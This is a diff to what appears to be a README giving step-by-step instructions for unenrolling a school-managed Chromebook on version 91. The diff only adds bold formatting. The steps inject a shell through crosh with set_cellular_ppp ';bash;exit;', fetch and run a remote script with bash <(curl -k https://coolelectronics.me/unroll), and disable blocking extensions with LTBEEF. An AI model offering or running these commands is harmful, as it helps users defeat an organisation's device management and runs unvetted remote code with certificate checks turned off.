@@ -2,7 +2,7 @@
 
 In order for this exploit to work you will need to downgrade to EXACTLY version 91. Downgrade instructions can be found here
 
-This method requires crosh to be unblocked on your chromebook. Crosh can be opened with CTRL+ALT+T If it's blocked by an extension, you can disable it with LTBEEF v91 WILL NOT WORK ON GRUNT BOARDS OR ARM CHROMEBOOKS MAKE SURE YOU HAVE EXACTLY VERSION 91.0.4472.102, NOT VERSION 91.0.4472.167 STEPS: Open crosh (ctrl + alt + t) Type in set_cellular_ppp ';bash;exit;' and enter Type in bash <(curl -k https://coolelectronics.me/unroll) and enter Wait for the script to finish, then powerwash your chromebook
+This method requires crosh to be unblocked on your chromebook. Crosh can be opened with CTRL+ALT+T If it's blocked by an extension, you can disable it with LTBEEF v91 WILL NOT WORK ON GRUNT BOARDS OR ARM CHROMEBOOKS MAKE SURE YOU HAVE EXACTLY VERSION 91.0.4472.102, NOT VERSION 91.0.4472.167 STEPS: Open crosh (ctrl + alt + t) Type in **set_cellular_ppp ';bash;exit;'** and enter Type in **bash <(curl -k https://coolelectronics.me/unroll)** and enter Wait for the script to finish, then powerwash your chromebook
 
 Steps to Re-Enroll when you turn your chromebook back in at the end of the year:
 
